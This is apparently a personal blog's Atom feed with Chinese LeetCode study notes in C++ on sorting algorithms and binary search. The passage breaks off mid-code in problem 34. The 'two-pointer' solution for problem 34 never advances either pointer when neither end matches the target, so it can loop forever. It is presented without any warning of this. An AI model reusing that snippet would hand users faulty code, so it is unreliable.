<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆 执 昔 来 的 旅 途</title>
  
  
  <link href="https://xizhi-future.github.io/atom.xml" rel="self"/>
  
  <link href="https://xizhi-future.github.io/"/>
  <updated>2025-12-03T06:17:49.524Z</updated>
  <id>https://xizhi-future.github.io/</id>
  
  <author>
    <name>xizhi-future</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>十二、排序</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E5%8D%81%E4%BA%8C%E3%80%81%E6%8E%92%E5%BA%8F/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E5%8D%81%E4%BA%8C%E3%80%81%E6%8E%92%E5%BA%8F/</id>
    <published>2025-12-03T06:17:36.000Z</published>
    <updated>2025-12-03T06:17:49.524Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="十二、排序"><a href="#十二、排序" class="headerlink" title="十二、排序"></a>十二、排序</h2><h3 id="912-排序数组"><a href="#912-排序数组" class="headerlink" title="912 排序数组"></a>912 排序数组</h3><p>给你一个整数数组 nums，请你将该数组【升序排列】。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快排  随机取 参考元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[l];<span class="comment">//取nums[l]作为参考元素</span></span><br><span class="line">        <span class="keyword">int</span> i=l, j=r;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[j]&gt;=pivot) j--;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[i]&lt;=pivot) i++;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(nums[i],nums[l]);</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">randomized_partition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="built_in">rand</span>() % (r-l+<span class="number">1</span>) + l; <span class="comment">// 随机选一个作为我们的主元</span></span><br><span class="line">        <span class="built_in">swap</span>(nums[l], nums[i]);<span class="comment">//放到 nums[l]位置</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">partition</span>(nums, l, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">int</span> pos = <span class="built_in">randomized_partition</span>(nums,l,r);<span class="comment">//划分</span></span><br><span class="line">            <span class="built_in">quick_sort</span>(nums,l,pos<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">quick_sort</span>(nums,pos+<span class="number">1</span>,r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">quick_sort</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    堆排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">maxHeapify</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> i, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (; (i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span> &lt;= len;) &#123;</span><br><span class="line">            <span class="keyword">int</span> lson = (i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> rson = (i &lt;&lt; <span class="number">1</span>) + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> large;</span><br><span class="line">            <span class="keyword">if</span> (lson &lt;= len &amp;&amp; nums[lson] &gt; nums[i]) &#123;</span><br><span class="line">                large = lson;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                large = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (rson &lt;= len &amp;&amp; nums[rson] &gt; nums[large]) &#123;</span><br><span class="line">                large = rson;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (large != i) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[large]);</span><br><span class="line">                i = large;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len / <span class="number">2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="built_in">maxHeapify</span>(nums, i, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = (<span class="keyword">int</span>)nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">buildMaxHeap</span>(nums, len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &gt;= <span class="number">1</span>; --i) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i], nums[<span class="number">0</span>]);</span><br><span class="line">            len -= <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">maxHeapify</span>(nums, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">heapSort</span>(nums);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    归并排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">merge</span>(nums,l,mid);</span><br><span class="line">        <span class="built_in">merge</span>(nums,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="keyword">int</span> i = l, j = mid+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=mid &amp;&amp; j&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&lt;=nums[j])</span><br><span class="line">                tmp[cnt++] = nums[i++];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                tmp[cnt++] = nums[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid) &#123;</span><br><span class="line">            tmp[cnt++] = nums[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= r) &#123;</span><br><span class="line">            tmp[cnt++] = nums[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r-l+<span class="number">1</span>;i++)</span><br><span class="line">            nums[i+l] = tmp[i];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        tmp.<span class="built_in">resize</span>(nums.<span class="built_in">size</span>(),<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">merge</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  冒泡排序 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=n<span class="number">-1</span>;j&gt;i;j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j<span class="number">-1</span>]&gt;nums[j])&#123;</span><br><span class="line">                    <span class="built_in">swap</span>(nums[j<span class="number">-1</span>],nums[j]);</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="literal">false</span>)</span><br><span class="line">                <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 插入排序 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[i];<span class="comment">//复制 哨兵放在tmp</span></span><br><span class="line">            <span class="keyword">int</span> j = i;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;<span class="number">0</span> &amp;&amp; nums[j<span class="number">-1</span>]&gt;tmp)&#123;</span><br><span class="line">                nums[j] = nums[j<span class="number">-1</span>];<span class="comment">//后移</span></span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[j] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  折半插入 */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sortArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> l,r,mid;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[i];<span class="comment">//复制 哨兵放在tmp</span></span><br><span class="line">            l = <span class="number">0</span>; r = i<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">                mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid]&gt;tmp) r = mid<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">else</span> l = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="comment">//l&gt;r时 停止</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=l;j--)<span class="comment">//把[l,i-1]后移</span></span><br><span class="line">                nums[j+<span class="number">1</span>] = nums[j];</span><br><span class="line">            nums[l] = tmp;<span class="comment">//最终插入位置是l</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704 二分查找"></a>704 二分查找</h3><p>给定一个 n 个元素有序的【升序】整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  法一：[left, right]</span></span><br><span class="line"><span class="comment">    定义 target 是在一个在[左闭右闭]的区间里，也就是[left, right]</span></span><br><span class="line"><span class="comment">    + while (left &lt;= right) 要使用 &lt;= ，因为left == right是有意义的，所以使用 &lt;=</span></span><br><span class="line"><span class="comment">    + if (nums[middle] &gt; target) right 要赋值为 middle - 1，因为当前这个nums[middle]一定不是target，那么接下来要查找的左区间结束下标位置就是 middle - 1</span></span><br><span class="line"><span class="comment">    + right = nums.size()-1;</span></span><br><span class="line"><span class="comment">    + int mid = left+(right-left)/2;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//[left, right]</span></span><br><span class="line">        <span class="comment">//int res = -1;   //注意 超出时间限制</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = left+(right-left)/<span class="number">2</span>;<span class="comment">//防止溢出</span></span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &gt; target)</span><br><span class="line">                right = mid<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">return</span> mid;<span class="comment">//res = mid;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">//return res;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  法二：[left, right) </span></span><br><span class="line"><span class="comment">    定义 target 是在一个在左闭右开的区间里，也就是[left, right) </span></span><br><span class="line"><span class="comment">    + while (left &lt; right)，这里使用 &lt; ,因为left == right在区间[left, right)是没有意义的</span></span><br><span class="line"><span class="comment">    + if (nums[middle] &gt; target) right 更新为 middle，因为当前nums[middle]不等于target，去左区间继续寻找，而寻找区间是左闭右开区间，所以right更新为middle，即：下一个查询区间不会去比较nums[middle]</span></span><br><span class="line"><span class="comment">    + right = nums.size();</span></span><br><span class="line"><span class="comment">    + int middle = left+((right-left) &gt;&gt; 1);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.<span class="built_in">size</span>(); <span class="comment">//[left, right)</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">int</span> middle = left+((right-left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[middle] &gt; target) &#123;</span><br><span class="line">                right = middle; <span class="comment">//区别</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[middle] &lt; target) &#123;</span><br><span class="line">                left = middle + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> middle;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="34-在排序数组中查找元素的第一个和最后一个位置——二分法"><a href="#34-在排序数组中查找元素的第一个和最后一个位置——二分法" class="headerlink" title="34 在排序数组中查找元素的第一个和最后一个位置——二分法"></a>34 在排序数组中查找元素的第一个和最后一个位置——二分法</h3><p>给你一个按照【非递减顺序排列】的整数数组 nums，和一个目标值 target。请你找出给定目标值在数组中的开始位置和结束位置。<br>如果数组中不存在目标值 target，返回 [-1, -1]。<br>你必须设计并实现时间复杂度为 O(log n) 的算法解决此问题。</p><p><strong>分析：</strong><br>大部分能想到的解法，比如：遍历一次，分别记录第一次和最好一次；双指针等等。都是 <strong>O(n)&gt;O(logn)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">searchRange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//升序排序，相同元素紧邻</span></span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">-1</span>,last = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[l]==target)&#123;</span><br><span class="line">                first = l;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[r]==target)&#123;</span><br><span class="line">                last = r;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;first,last&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>一看到时间复杂度是O(logn)，首先想到【二分查找】</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">searchRange</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//升序排序，相同元素紧邻</span></span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">-1</span>,last = <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//找左边界 first</span></span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)&#123;</span><br><span class="line">                first = mid;<span class="comment">//确定左边界</span></span><br><span class="line">                r=mid<span class="number">-1</span>;<span class="comment">//重点</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]&lt;target)</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找右边界 last</span></span><br><span class="line">        l=<span class="number">0</span>,r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)&#123;</span><br><span class="line">                last = mid;<span class="comment">//确定右边界</span></span><br><span class="line">                l=mid+<span class="number">1</span>;<span class="comment">//重点</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span 